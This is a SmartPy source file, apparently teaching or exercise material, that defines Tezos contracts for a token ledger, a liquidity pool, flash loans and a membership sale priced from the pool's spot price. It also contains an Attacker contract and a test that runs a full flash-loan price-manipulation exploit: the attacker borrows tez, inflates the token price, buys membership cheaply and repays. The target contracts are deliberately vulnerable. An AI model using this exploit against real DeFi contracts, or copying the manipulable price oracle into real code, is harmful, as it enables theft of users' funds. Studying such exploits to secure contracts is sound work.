import smartpy as sp

@sp.module
def main():

    paramType:type = sp.record(source = sp.address, destination = sp.address, amount = sp.nat)

    class Ledger(sp.Contract):
        def __init__(self, owner, total_supply):
            self.data.balances = sp.big_map({ owner : total_supply })
            self.data.operators = sp.big_map({ owner: sp.set(owner)})
          
    
        @sp.entrypoint
        def transfer(self, source, destination, amount):
            assert self.data.operators[source].contains(sp.sender)
            assert self.data.balances[source] >= amount
            self.data.balances[source] = sp.as_nat(self.data.balances[source] - amount)
            if not self.data.balances.contains(destination):
                self.data.balances[destination] = sp.nat(0)
                if not self.data.operators.contains(sp.sender):
                    self.data.operators[destination] = sp.set(destination)
            self.data.balances[destination] += amount

        @sp.onchain_view
        def get_balance(self, user):
            sp.cast(user, sp.address)
            return self.data.balances[user]

        @sp.entrypoint
        def add_operator(self, operator):
            if not self.data.operators.contains(sp.sender):
                self.data.operators[sp.sender] = sp.set(sp.sender)
            self.data.operators[sp.sender].add(operator)

        @sp.entrypoint
        def del_operator(self, operator):
            self.data.operators[sp.sender].remove(operator)
    
    class LiquidityPool(sp.Contract):
        def __init__(self, owner, ledger):
            self.data.ledger = ledger
            self.data.ledger_transfer = None
            self.data.owner = owner
            self.data.K = sp.tez(0)
            self.data.tokensOwned = sp.nat(0)
            # tokensOwned * sp.balance = K -> should always be true

        @sp.entrypoint
        def provide_liquidity(self, depositedTokens):
            assert sp.sender == self.data.owner
            assert self.data.K == sp.tez(0)
            self.data.K = sp.mul(sp.balance, depositedTokens)

            self.data.tokensOwned = depositedTokens

            self.data.ledger_transfer = sp.contract(paramType, self.data.ledger, entrypoint="transfer")
            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = depositedTokens), sp.tez(0), self.data.ledger_transfer.unwrap_some())
            
        @sp.entrypoint
        def withdraw_liquidity(self):
            assert sp.sender == self.data.owner
            sp.send(sp.sender, sp.balance)
            
            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = self.data.tokensOwned), sp.tez(0), self.data.ledger_transfer.unwrap_some())

            self.data.tokensOwned = sp.nat(0)
            self.data.K = sp.tez(0)

        
        @sp.entrypoint
        def sellTokens(self, nbTokensSold, minTezRequested):
            ratio = sp.ediv(self.data.K, self.data.tokensOwned + nbTokensSold).unwrap_some()
            tezObtained = sp.balance - sp.fst(ratio)
            assert tezObtained >= minTezRequested

            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = nbTokensSold), sp.tez(0), self.data.ledger_transfer.unwrap_some())

            self.data.tokensOwned += nbTokensSold
            sp.send(sp.sender, tezObtained)

        @sp.entrypoint
        def buyTokens(self, minTokensBought):
            sp.cast(minTokensBought, sp.nat)
            tokensObtained = sp.as_nat(self.data.tokensOwned - sp.fst(sp.ediv(self.data.K, sp.balance).unwrap_some()))
            assert tokensObtained >= minTokensBought

            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = tokensObtained), sp.tez(0), self.data.ledger_transfer.unwrap_some())

            self.data.tokensOwned = sp.as_nat(self.data.tokensOwned - tokensObtained)
            

        @sp.onchain_view
        def get_token_price(self):
            # returns what we would get if we sold one token
            ratio1 = sp.ediv(self.data.K, self.data.tokensOwned).unwrap_some()
            ratio2 = sp.ediv(self.data.K, sp.as_nat(self.data.tokensOwned - 1)).unwrap_some()
            trace ("The current value of K is:")
            trace(self.data.K)
            trace("The pool owns this amount of tokens:")
            trace(self.data.tokensOwned)
            trace("The balance of the pool is:")
            trace(sp.balance)
            trace("The ratios before and after a potential purchase of 1 token would be:")
            trace(ratio1)
            trace(ratio2)
            tokenPrice = sp.fst(ratio2) - sp.fst(ratio1)
            trace("The price of the token returned is:")
            trace(tokenPrice)
            return tokenPrice

    class FlashLoanTez(sp.Contract):
        def __init__(self, owner, ledger, interest_rate):
            self.data.owner = owner
            self.data.interest_rate = interest_rate
            self.data.in_progress = False
            self.data.loan_amount = sp.tez(0)
            self.data.borrower = owner
            self.data.repaid = False

        @sp.entrypoint
        def deposit(self):
            pass
        
        @sp.entrypoint
        def borrow(self, loan_amount, callback):
            assert not self.data.in_progress
            self.data.in_progress = True

            self.data.borrower = sp.sender
            self.data.loan_amount = loan_amount
            sp.send(sp.sender, loan_amount)

            sp.transfer((), sp.tez(0), callback)
            
            flashLoan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
            sp.transfer((), sp.tez(0), flashLoan_check_repaid)

        @sp.entrypoint
        def repay(self):
            assert self.data.in_progress
            assert sp.amount >= sp.split_tokens(self.data.loan_amount, 100 + self.data.interest_rate, 100)
            self.data.repaid = True
        
        @sp.entrypoint
        def check_repaid(self):
            assert self.data.in_progress
            assert self.data.repaid
            self.data.in_progress = False

        @sp.entrypoint
        def claim(self):
            assert sp.sender == self.data.owner
            assert not self.data.in_progress
            sp.send(sp.sender, sp.balance)
    
    class FlashLoan(sp.Contract):
        def __init__(self, owner, ledger, interest_rate):
            self.data.ledger = ledger
            self.data.owner = owner
            self.data.interest_rate = interest_rate
            self.data.in_progress = False
            self.data.loan_amount = sp.nat(0)
            self.data.ledger_contract_opt = None
            self.data.tokens_owned = sp.nat(0)
            self.data.borrower = owner

        @sp.entrypoint
        def deposit(self, tokensDeposited):
            self.data.ledger_contract_opt = sp.contract(paramType, self.data.ledger, entrypoint="transfer")
            sp.transfer(sp.record(source = sp.sender, destination = sp.self_address(), amount = tokensDeposited), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.tokens_owned = tokensDeposited
        
        @sp.entrypoint
        def borrow(self, loan_amount, callback):
            assert not self.data.in_progress
            self.data.in_progress = True

            self.data.borrower = sp.sender
            
            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = loan_amount), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.loan_amount = loan_amount

            #sp.cast(callback, ..)
            sp.transfer((), sp.tez(0), callback)
            
            flashLoan_check_repaid = sp.contract(sp.unit, sp.self_address(), entrypoint="check_repaid").unwrap_some()
            sp.transfer((), sp.tez(0), flashLoan_check_repaid)

        @sp.entrypoint
        def check_repaid(self):
            assert self.data.in_progress
            amount_repaid = (self.data.loan_amount * (100 + self.data.interest_rate)) / 100
            sp.transfer(sp.record(source = self.data.borrower, destination = sp.self_address(), amount = amount_repaid), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.in_progress = False

        @sp.entrypoint
        def claim(self):
            assert sp.sender == self.data.owner
            assert not self.data.in_progress
            sp.transfer(sp.record(source = sp.self_address(), destination = sp.sender, amount = self.data.tokens_owned), sp.tez(0), self.data.ledger_contract_opt.unwrap_some())
            self.data.tokens_owned = sp.nat(0)

    class Membership(sp.Contract):
        def __init__(self, membership_price, owner, ledger, liquidityPool):
            self.data.owner = owner
            self.data.membership_price = membership_price
            self.data.members = sp.set()
            self.data.ledger = ledger
            self.data.liquidityPool = liquidityPool

        @sp.entrypoint
        def join(self):
            assert sp.amount == self.data.membership_price
            self.data.members.add(sp.sender)
            sp.send(self.data.owner, sp.amount)
            self.data.members.add(sp.sender)

        @sp.entrypoint
        def join_with_tokens(self, nbTokens):
            sp.cast(nbTokens, sp.nat)
            tokenPrice =  sp.view("get_token_price", self.data.liquidityPool, (), sp.mutez).unwrap_some();
            assert sp.mul(tokenPrice, nbTokens) > self.data.membership_price
            ledger_contract = sp.contract(paramType, self.data.ledger, entrypoint="transfer").unwrap_some()
            sp.transfer(sp.record(source = sp.sender, destination = self.data.owner, amount = nbTokens), sp.tez(0), ledger_contract)
            self.data.members.add(sp.sender)

    class Attacker(sp.Contract):
        def __init__(self, ledger, liquidityPool, membership, flashLoan, membership_price):
            self.data.ledger = ledger
            self.data.liquidityPool = liquidityPool
            self.data.membership = membership
            self.data.flashLoan = flashLoan
            self.data.expecedBoughtTokens = sp.nat(1667)
            self.data.loan_amount = sp.tez(10000)
            self.data.membership_price = membership_price

        @sp.entrypoint
        def attack(self):
            trace("attack starts")
            flashLoan_borrow = sp.contract(sp.record(loan_amount = sp.mutez, callback = sp.contract[sp.unit]),
                                             self.data.flashLoan,
                                             entrypoint="borrow").unwrap_some()
            part2_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attackPart2").unwrap_some()
            trace("We borrow this number of tez from the flashloan. It will then call part 2 of the attack")
            trace(self.data.loan_amount)
            sp.transfer(sp.record(loan_amount = self.data.loan_amount, callback = part2_contract), sp.tez(0), flashLoan_borrow)

        @sp.entrypoint
        def attackPart2(self):
            trace("attack Part 2")
            liquidityPool_buyTokens = sp.contract(sp.nat, self.data.liquidityPool, entrypoint="buyTokens").unwrap_some()
            trace("We purchase some tokens using these borrowed tez")
            trace("We expect to receive this amount:")
            trace(self.data.expecedBoughtTokens)
            sp.transfer(self.data.expecedBoughtTokens, self.data.loan_amount, liquidityPool_buyTokens)    

            part3_contract = sp.contract(sp.unit, sp.self_address(), entrypoint = "attackPart3").unwrap_some()
            trace("We call part3 in a transaction so that it takes place after the purchase is effective")
            sp.transfer((), sp.tez(0), part3_contract)


        @sp.entrypoint
        def attackPart3(self):
            trace("We call the get_token_price view")
            tokenPrice =  sp.view("get_token_price", self.data.liquidityPool, (), sp.mutez).unwrap_some()
            trace("Token price is now:")
            trace(tokenPrice)
            sp.cast(self.data.membership_price, sp.mutez)
            priceInTokens = sp.fst(sp.ediv(self.data.membership_price, tokenPrice).unwrap_some()) + 1
            trace("Price in tokens at which we buy the membership:")
            trace(priceInTokens)
            membership_contract = sp.contract(sp.nat, self.data.membership, entrypoint = "join_with_tokens").unwrap_some()

            trace("Purchase of the membership")
            sp.transfer(priceInTokens, sp.tez(0), membership_contract)
            
            liquidityPool_sellTokens = sp.contract(sp.record(nbTokensSold = sp.nat, minTezRequested = sp.mutez), self.data.liquidityPool, entrypoint="sellTokens").unwrap_some()
            trace("We can now sell our tokens back to the liquidityPool")
            sp.transfer(sp.record(nbTokensSold = self.data.expecedBoughtTokens, minTezRequested = sp.tez(0)), sp.tez(0), liquidityPool_sellTokens)

            trace("And we repay the flashloan, sending this amount:")
            amountRepaid = self.data.loan_amount + sp.tez(100)
            trace(amountRepaid)
            flashLoan_repay = sp.contract(sp.unit, self.data.flashLoan, entrypoint="repay").unwrap_some()
            sp.transfer((), amountRepaid, flashLoan_repay)
        
        @sp.entrypoint
        def default(self):
            pass

@sp.add_test(name="testing truly endless wall")
def test():
    alice = sp.test_account("alice")
    bob = sp.test_account("bob")
    scenario = sp.test_scenario(main)
    ledger = main.Ledger(owner = alice.address, total_supply = 1000000)

    scenario += ledger

    
    liquidityPool = main.LiquidityPool(owner = alice.address, ledger = ledger.address)
    scenario += liquidityPool

    ledger.add_operator(liquidityPool.address).run(sender = alice)
    liquidityPool.provide_liquidity(2000).run(sender = alice, amount = sp.tez(2000))
    
    membership = main.Membership(membership_price = sp.tez(1000), owner = alice.address, ledger = ledger.address, liquidityPool = liquidityPool.address)
    scenario += membership

    flashLoan = main.FlashLoanTez(owner = alice.address, ledger = ledger.address, interest_rate = 1)
    scenario += flashLoan
    ledger.add_operator(flashLoan.address).run(sender = alice)

    flashLoan.deposit().run(sender = alice, amount = sp.tez(100000))
    
    attacker = main.Attacker(ledger = ledger.address, liquidityPool = liquidityPool.address, membership = membership.address, flashLoan = flashLoan.address, membership_price = sp.tez(1000))
    scenario += attacker
    ledger.transfer(source = alice.address, destination = attacker.address, amount = 2000).run(sender = alice)
    ledger.add_operator(liquidityPool.address).run(sender = attacker.address)
    ledger.add_operator(flashLoan.address).run(sender = attacker.address)
    ledger.add_operator(membership.address).run(sender = attacker.address)
    
    attacker.attack().run(sender = bob, amount = sp.tez(500))



